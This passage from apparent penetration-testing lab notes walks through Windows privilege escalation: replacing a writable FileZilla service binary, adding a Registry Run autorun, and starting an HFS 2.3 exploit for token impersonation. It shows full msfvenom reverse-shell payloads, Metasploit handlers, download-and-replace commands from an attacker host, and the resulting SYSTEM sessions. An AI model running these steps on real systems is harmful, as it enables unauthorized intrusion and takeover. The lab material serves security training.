%PATH%            : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\student\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

Key            : HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\FileZilla Server Interface
Path           : "C:\Program Files (x86)\FileZilla Server\FileZilla Server Interface.exe"
ModifiableFile : @{ModifiablePath=C:\Program Files (x86)\FileZilla Server\FileZilla Server Interface.exe;
                 IdentityReference=PRIV-ESC\student; Permissions=System.Object[]}
Name           : HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\FileZilla Server Interface
Check          : Modifiable Registry Autorun
```

**Explanation:** The `Invoke-PrivEscAudit` function scans the system for privilege escalation opportunities. It reveals that the `FileZilla Server` service executable is modifiable by the `student` user. Since the service runs with `LocalSystem` privileges, this can be exploited to gain elevated access.

_Check the ACL (Access Control List) of the vulnerable service executable to confirm permissions._

`Get-Acl 'C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe' | Format-List`:
```
Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe
Owner  : BUILTIN\Administrators
Group  : PRIV-ESC\None
Access : PRIV-ESC\student Allow  FullControl ←
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
```

**Explanation:** The ACL confirms that the `student` user has `FullControl` over the `FileZilla Server.exe` file, meaning they can modify or replace this executable, making it a prime target for exploitation.

<span style="color: #e57373;">**Attacker machine**</span>.

_Check the network configuration of the attacker machine._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.3  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:03  txqueuelen 0  (Ethernet)
        RX packets 2270  bytes 198307 (193.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2363  bytes 2155574 (2.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.39.3  netmask 255.255.255.0  broadcast 10.10.39.255 ←
        ether 02:42:0a:0a:27:03  txqueuelen 0  (Ethernet)
        RX packets 13  bytes 950 (950.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 6234  bytes 15756628 (15.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6234  bytes 15756628 (15.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Open Metasploit and set up a handler to catch the reverse shell connection._

`msfconsole -q`

`search multi/handler`, `use exploit/multi/handler`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.39.3`, `set LPORT 4444`, `show advanced`, `set InitialAutoRunScript post/windows/manage/migrate`, `exploit -j`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.39.3:4444 ←
```

**Explanation:** Metasploit is configured to handle the incoming reverse shell connection on port `4444`. The `InitialAutoRunScript` option is set to automatically migrate the session to a more stable process once the connection is established.

_Create a malicious executable using `msfvenom` and host it on a simple HTTP server._

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.39.3 LPORT=4444 -f exe -o '/root/Desktop/FileZilla Server.exe'`:
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: /root/Desktop/FileZilla Server.exe ←
```

**Explanation:** The `msfvenom` command generates a malicious payload wrapped in an executable that will provide a reverse shell to the attacker's machine. This executable is named `FileZilla Server.exe` to replace the legitimate service binary on the target machine.

_Change to the directory where the malicious executable is saved and start an HTTP server to host it._

`cd /root/Desktop`

`python3 -m http.server 80`

**Explanation:** A Python HTTP server is used to host the malicious executable, allowing it to be downloaded directly onto the target machine.

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Download the malicious executable and replace the legitimate FileZilla Server executable._

`iwr -UseBasicParsing -Uri 'http://10.10.39.3/FileZilla Server.exe' -OutFile 'C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe'`

**Explanation:** The `iwr` (Invoke-WebRequest) command downloads the malicious executable from the attacker's machine and replaces the legitimate FileZilla Server executable with it.

_Check the last write time of the service executable to confirm the replacement._

`(dir 'C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe').LastWriteTime`:
```
Monday, August 12, 2024 10:55:02 AM
```

**Explanation:** Verifying the `LastWriteTime` ensures that the executable has been successfully replaced with the malicious version.

_Start the FileZilla Server service to trigger the malicious payload._

`services.msc` > `FileZilla Server FTP server` (right-click) > `Start`

**Explanation:** Starting the service executes the malicious `FileZilla Server.exe`, which then initiates the reverse shell connection back to the attacker's machine.

<span style="color: #e57373;">**Attacker machine**</span>.

_Confirm that the Meterpreter session has been successfully opened._

```
[*] Sending stage (176195 bytes) to 10.4.20.66
[*] Meterpreter session 1 opened (10.10.39.3:4444 -> 10.4.20.66:49835) at 2024-08-12 16:29:31 +0530 ←
[*] Session ID 1 (10.10.39.3:4444 -> 10.4.20.66:49835) processing InitialAutoRunScript 'post/windows/manage/migrate'
[*] Running module against PRIV-ESC
[*] Current server process: FileZilla Server.exe (2636)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 4216
[+] Successfully migrated into process 4216
```

**Explanation:** The Meterpreter session is successfully opened and immediately migrates into a more stable process (`notepad.exe`) to ensure persistence and avoid detection.

_List active sessions and interact with the Meterpreter session._

`sessions`, `sessions -i`

_Verify the user context of the Meterpreter session._

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

_Search for files containing the word "flag" to locate the target file._

`shell`, `where /r C:\ "*flag*"`:
```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C:\Users\Administrator\Downloads\flag.txt ←
```

**Explanation:** The `where` command is used to search the system for files containing "flag" in their name, which is typically the target file for CTF challenges.

_Display the contents of the flag file._

`type C:\Users\Administrator\Downloads\flag.txt`:
```
81f7a70ba854c677d46369cdbd6153ef ←
```

### Windows Registry AutoRuns - Theory

#### Registry AutoRun

Registry autoruns are a common vector for privilege escalation in Windows systems.

This technique involves exploiting registry keys that are used to configure programs or scripts to automatically run when certain events occur, such as system startup, user login, or service initialization.

Attackers can leverage insecure configurations or weak permissions in these registry keys to execute malicious code with elevated privileges.

#### Privilege Escalation via Registry AutoRuns

1. Identify Vulnerable Registry Autoruns
The attacker identifies registry keys that control autoruns and checks their permissions. Tools like AccessChk or PowerUp can help locate insecure keys.

2. Exploiting Weak Permissions
If the attacker has write access to a registry key used for autoruns, they can modify the key's value to point to a malicious executable or script. This executable will then run with the permissions of the original autorun process, often leading to privilege escalation.

3. Achieving Privilege Escalation
When the system restarts or the target user logs in, the malicious code runs with elevated permissions, granting the attacker higher privileges or allowing them to perform unauthorized actions.

#### Typical registry keys associated with autoruns include:

- **Autoruns for system startup:** `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- **Autoruns for user login:** `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- **Configuration for Windows services, which can run with elevated privileges:** `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services`

### Windows Registry AutoRuns - Lab

#### Lab Environment

A Kali GUI machine and a Windows machine provided to you. 
Multi views for the Windows machine access has given to you:
1. Regular user (student).
2. Administrator access for application analysis. 

HFS (Simple File Server) is running on the startup of the windows system. Run [Autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) utility to locate the HFS registry location for privilege escalation.

**Note**: Use student machine for all the privilege escalation activities. The Administrator access is only given for log-in and sign out purpose.

**Objective**: Gain access to Meterpreter session with high privilege.

#### Lab Solution

<span style="color: #64b5f6;">**Target (victim) machine: `student` privilege**</span>.

_Verify the current user to confirm your identity on the target machine._

`whoami`:
```
priv-esc\student ←
```

_Navigate to the Desktop directory to access the tools provided for privilege escalation._

`cd ./Desktop`, `dir`:
```
    Directory: C:\Users\student\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/27/2020  10:09 AM                PowerSploit
d-----       10/27/2020  10:09 AM                SysinternalsSuite ←
d-----       10/27/2020  10:32 AM                Tools
```

_Change to the SysinternalsSuite directory where Autoruns.exe is located._

`cd ./SysinternalsSuite`, `dir`:
```
    Directory: C:\Users\student\Desktop\SysinternalsSuite

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/27/2020  10:09 AM        1378688 accesschk.exe
-a----       10/27/2020  10:09 AM         759176 accesschk64.exe
-a----       10/27/2020  10:09 AM         174968 AccessEnum.exe
-a----       10/27/2020  10:09 AM          50379 AdExplorer.chm
-a----       10/27/2020  10:09 AM         479832 ADExplorer.exe
-a----       10/27/2020  10:09 AM         401616 ADInsight.chm
-a----       10/27/2020  10:09 AM        5106056 ADInsight.exe
-a----       10/27/2020  10:09 AM        1772416 ADInsight64.exe
-a----       10/27/2020  10:09 AM         150328 adrestore.exe
-a----       10/27/2020  10:09 AM         341072 Autologon.exe
-a----       10/27/2020  10:09 AM         441224 Autologon64.exe
-a----       10/27/2020  10:09 AM          50512 autoruns.chm
-a----       10/27/2020  10:09 AM         755576 Autoruns.exe ←
-a----       10/27/2020  10:09 AM         751696 Autoruns64.dll
-a----       10/27/2020  10:09 AM         869752 Autoruns64.exe
-a----       10/27/2020  10:09 AM         778616 Autoruns64a.dll

...

-a----       10/27/2020  10:09 AM         398712 whois.exe
-a----       10/27/2020  10:09 AM         523632 whois64.exe
-a----       10/27/2020  10:09 AM         729464 Winobj.exe
-a----       10/27/2020  10:09 AM           7653 WINOBJ.HLP
-a----       10/27/2020  10:09 AM        1059712 ZoomIt.exe
-a----       10/27/2020  10:09 AM         588152 ZoomIt64.exe
```

_Run Autoruns to inspect the startup entries and locate the HFS HTTP Server entry in the registry._

`./Autoruns.exe` > `Logon`:

| Autorun Entry                                                                                     | Description                         | Publisher                            | Image Path                                     | Timestamp               | VirusTotal |
|---------------------------------------------------------------------------------------------------|-------------------------------------|--------------------------------------|------------------------------------------------|-------------------------|------------|
| HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\AlternateShell                                     | cmd.exe                             | Windows Command Processor            | c:\windows\system32\cmd.exe                    | 11/15/2018 12:05 AM     |            |
| HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells\AvailableShells        | 30000                               |                                      | File not found: cd /d                          | 9/15/2018 7:19 AM       |            |
| HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run                                                | HFS HTTP Server                     | (Not verified) rejetto                | c:\program files\httpserver\hfs.exe ←         | 6/19/1992 10:22 PM      |            |
| HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components                                         | n/a                                 | Microsoft .NET IE SECURITY REG...    | c:\windows\system32\mscoreis.dll               | 10/27/2020 9:46 AM      |            |
| HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components                              | n/a                                 | Microsoft .NET IE SECURITY REG...    | c:\windows\syswow64\mscoreis.dll               | 10/27/2020 9:46 AM      |            |

_Check the access control list (ACL) for the registry key that controls the HFS HTTP Server startup to determine if the current user can modify it._

`Get-Acl -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' | Format-List`:
```
Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : PRIV-ESC\student Allow  FullControl ←
         BUILTIN\Users Allow  ReadKey
         BUILTIN\Users Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
         ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
         -2147483648
Audit  :
Sddl   : O:SYG:SYD:AI(A;CI;KA;;;S-1-5-21-3061667678-1811888172-2700530533-1008)(A;ID;KR;;;BU)(A;CIIOID;GR;;;BU)(A;ID;KA;;;B
         A)(A;CIIOID;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S
         -1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;
         ;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
```

**Explanation:** The output shows that the `student` user has `FullControl` permissions on this registry key, allowing the user to modify its contents and potentially add a new startup entry.

_Use the Windows Registry Editor to confirm the location and the content of the `Run` key._

`regedit` > `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`:

| Name            | Type           | Data                                               |
|-----------------|----------------|----------------------------------------------------|
| (Default)       | REG_SZ         | (value not set)                                    |
| HFS HTTP Server | REG_SZ         | "C:\Program Files\HTTPServer\hfs.exe" ←            |
| SecurityHealth  | REG_EXPAND_SZ  | %windir%\system32\SecurityHealthSystray.exe        |

_Check the access control list (ACL) for the directory where the HFS executable is located._

`Get-Acl 'C:\Program Files\HTTPServer\' | Format-List`:
```
Path   : Microsoft.PowerShell.Core\FileSystem::C:\PROGRAM FILES\HTTPSERVER\
Owner  : BUILTIN\Administrators
Group  : PRIV-ESC\None
Access : NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl ←
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  :
Sddl   : O:BAG:S-1-5-21-3061667678-1811888172-2700530533-513D:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-185
         3292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY
         )(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;G
         A;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)
```

**Explanation:** The ACL shows that administrators have full control over the HTTPServer directory, allowing you to replace or modify files in this directory if you have administrative access.

<span style="color: #e57373;">**Attacker machine**</span>.

_Check the IP configuration to identify the attacker's IP address._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.6  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:06  txqueuelen 0  (Ethernet)
        RX packets 16275  bytes 1222785 (1.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15431  bytes 3090152 (2.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.39.4  netmask 255.255.255.0  broadcast 10.10.39.255 ←
        ether 02:42:0a:0a:27:04  txqueuelen 0  (Ethernet)
        RX packets 22  bytes 1460 (1.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 63089  bytes 21354503 (20.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 63089  bytes 21354503 (20.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Launch the Metasploit Framework to prepare a handler for the reverse shell._

`msfconsole -q`

_Search for the multi/handler exploit and configure it for the reverse TCP payload._

`search multi/handler`, `use exploit/multi/handler`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.39.4`, `set LPORT 4444`, `show advanced`, `set InitialAutoRunScript post/windows/manage/migrate`, `exploit -j`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.39.4:4444 ←
```

**Explanation:** The handler is now set up to receive a connection from the reverse shell that will be created and executed on the target machine.

_Create a reverse shell payload using msfvenom and save it as an executable file._

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.39.4 LPORT=4444 -f exe -o /root/Desktop/reverse_shell.exe`:
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: /root/Desktop/reverse_shell.exe ←
```

_Change to the Desktop directory to host the reverse shell executable via a simple HTTP server._

`cd /root/Desktop`

_Use Python's built-in HTTP server to serve the reverse shell executable._

`python3 -m http.server 80`

<span style="color: #64b5f6;">**Target (victim) machine: `student` privilege**</span>.

_Create a new directory to store the downloaded reverse shell payload._

`mkdir C:\Users\student\Desktop\malware`

_Use PowerShell to download the reverse shell executable from the attacker's machine._

`iwr -UseBasicParsing -Uri 'http://10.10.39.4/reverse_shell.exe' -OutFile 'C:\Users\student\Desktop\malware\reverse_shell.exe'`

_Navigate to the directory containing the downloaded reverse shell and verify its presence._

`cd C:\Users\student\Desktop\malware`, `dir`:
```
    Directory: C:\Users\student\Desktop\malware

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/12/2024  10:02 AM          73802 reverse_shell.exe ←
```

_Use the Registry Editor to create a new startup entry for the reverse shell executable._

`regedit` > `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` > `New` (right-click) > `String Value`:

| Name            | Type           | Data                                               |
|-----------------|----------------|----------------------------------------------------|
| (Default)       | REG_SZ         | (value not set)                                    |
| HFS HTTP Server | REG_SZ         | "C:\Program Files\HTTPServer\hfs.exe"              |
| SecurityHealth  | REG_EXPAND_SZ  | %windir%\system32\SecurityHealthSystray.exe        |
| reverse_shell   | REG_SZ         | "C:\Users\student\Desktop\malware\reverse_shell.exe" ←   |

<span style="color: #64b5f6;">**Target (victim) machine: `Administrator` privilege**</span>.

_Sign out from the Administrator account to trigger the startup programs, including the reverse shell._

`whoami`:
```
priv-esc\administrator ←
```

`shutdown /l`

<span style="color: #e57373;">**Attacker machine**</span>.

_Wait for the target machine to connect back to the Metasploit handler, establishing a Meterpreter session._

```
[*] Sending stage (176195 bytes) to 10.4.17.192
[*] Meterpreter session 1 opened (10.10.39.4:4444 -> 10.4.17.192:49988) at 2024-08-12 15:41:38 +0530 ←
[*] Session ID 1 (10.10.39.4:4444 -> 10.4.17.192:49988) processing InitialAutoRunScript 'post/windows/manage/migrate'
[*] Running module against PRIV-ESC
[*] Current server process: malware.exe (6752)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 3712
[+] Successfully migrated into process 3712
```

_List the available sessions and interact with the newly created session._

`sessions`, `sessions -i 1`

_Verify the user context to ensure that the Meterpreter session is running with administrator privileges._

`getuid`:
```
Server username: PRIV-ESC\Administrator ←
```

_Search for files containing the word "flag" to locate the target file._

`shell`, `where /r C:\ "*flag*"`:
```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C:\Users\Administrator\Downloads\flag.txt ←
```

_Display the contents of the flag file._

`type C:\Users\Administrator\Downloads\flag.txt`:
```
b5eda0a74558a342cf659187f06f746f ←
```

### Impersonation Attacks: Incognito Access Token Impersonation - Theory

#### Windows Access Tokens

Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS).

A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed.

Access tokens are generated by the `winlogon.exe` process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the `userinit.exe` process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.

Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.

An access token will typically be assigned one of the following security levels:
	- **Impersonate-level tokens** are <u>created as a direct result of a non-interactive login on Windows</u>, typically through specific system services or domain logons.
	- **Delegate-level tokens** are typically <u>created through an interactive login on Windows</u>, primarily through a traditional login or through remote access protocols such as RDP.

**Impersonate-level tokens** can be <u>used to impersonate a token on the local system</u> and not on any external systems that utilize the token.
**Delegate-level tokens** pose the largest threat as they can be <u>used to impersonate tokens on any system</u>.

#### Windows Privileges

The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.

The following are the privileges that are required for a successful impersonation attack:
	- **SeAssignPrimaryToken**: Allows a process to assign the primary token for a process. This privilege is critical for creating processes with specific user security contexts.
	- **SeCreateToken**: The SeCreateToken privilege allows a process to create new security tokens, typically used for authentication and identity representation.
	- **SeImpersonatePrivilege**: <u>The SeImpersonatePrivilege allows a process to impersonate other users' security tokens</u>. This privilege is crucial for operations where a service or process needs to perform tasks on behalf of a different user.

#### The Incognito Module

<u>Incognito is a built-in meterpreter module</u> that was originally a standalone application <u>that allows you to impersonate user tokens</u> after successful exploitation.

We can use the incognito module to display a list of available tokens that we can impersonate.

### Impersonation Attacks: Incognito Access Token Impersonation - Lab

#### Lab Environment

A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (`/root/Desktop/target`). 

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.

Then, escalate privilege using [Incognito](https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/incognito/incognito.c) Metasploit local exploit module. 

**Goal**: This lab covers the process of impersonating access tokens on Windows with Meterpreter's in-built Incognito module.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

_Check the network configuration to confirm the IP address of the attacker machine._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.10  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:0a  txqueuelen 0  (Ethernet)
        RX packets 2468  bytes 212734 (207.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2462  bytes 2427472 (2.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.42.5  netmask 255.255.255.0  broadcast 10.10.42.255 ←
        ether 02:42:0a:0a:2a:05  txqueuelen 0  (Ethernet)
        RX packets 17  bytes 1286 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4  bytes 336 (336.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 7084  bytes 27113576 (25.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7084  bytes 27113576 (25.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Read the target machine's IP address from the provided text file._

`cat /root/Desktop/target`:
```
Target IP Address : 10.4.18.194 ←
```

_Verify connectivity to the target machine by sending ICMP echo requests (ping)._

`ping -c 3 10.4.18.194`:
```
PING 10.4.18.194 (10.4.18.194) 56(84) bytes of data.
64 bytes from 10.4.18.194: icmp_seq=1 ttl=125 time=9.99 ms
64 bytes from 10.4.18.194: icmp_seq=2 ttl=125 time=9.47 ms
64 bytes from 10.4.18.194: icmp_seq=3 ttl=125 time=8.88 ms

--- 10.4.18.194 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms ←
rtt min/avg/max/mdev = 8.878/9.446/9.994/0.455 ms
```

_Perform a full TCP port scan and version detection on the target machine using `nmap` to identify open ports and running services._

`nmap -Pn -sS -sV 10.4.18.194 -p-`:
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2024-08-12 19:00 IST
Nmap scan report for 10.4.18.194
Host is up (0.0091s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          HttpFileServer httpd 2.3 ←
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.30 seconds
```

**Explanation:** The `nmap` scan identifies several open ports on the target machine, with `port 80` running `HttpFileServer 2.3`. This version of HttpFileServer is known to have vulnerabilities that could be exploited.

_Search for known exploits for `HttpFileServer 2.3` using `searchsploit` to find a suitable attack vector._

`searchsploit hfs 2.3`:
```
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                           | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                        | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                   | windows/remote/34668.txt ←
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                   | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                              | windows/webapps/34852.txt
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

**Explanation:** The search results indicate that `HttpFileServer 2.3.x` is vulnerable to remote command execution. The exploit listed under `windows/remote/34668.txt` can be used to gain unauthorized access.

_Launch Metasploit and use the exploit module for `Rejetto HTTP File Server` to perform remote command execution._

`msfconsole -q`

_Search for the relevant Metasploit module and configure it for the attack._

`search hfs`, `use exploit/windows/http/rejetto_hfs_exec`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set RHOSTS 10.4.18.194`, `set LHOST 10.10.42.5`, `set LPORT 4444`, `exploit`:
```
[*] Started reverse TCP handler on 10.10.42.5:4444 
[*] Using URL: http://0.0.0.0:8080/xK83DAyjIoCZ
[*] Local IP: http://10.10.42.5:8080/xK83DAyjIoCZ
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /xK83DAyjIoCZ
[*] Sending stage (175174 bytes) to 10.4.18.194
[!] Tried to delete %TEMP%\mchqDB.vbs, unknown result
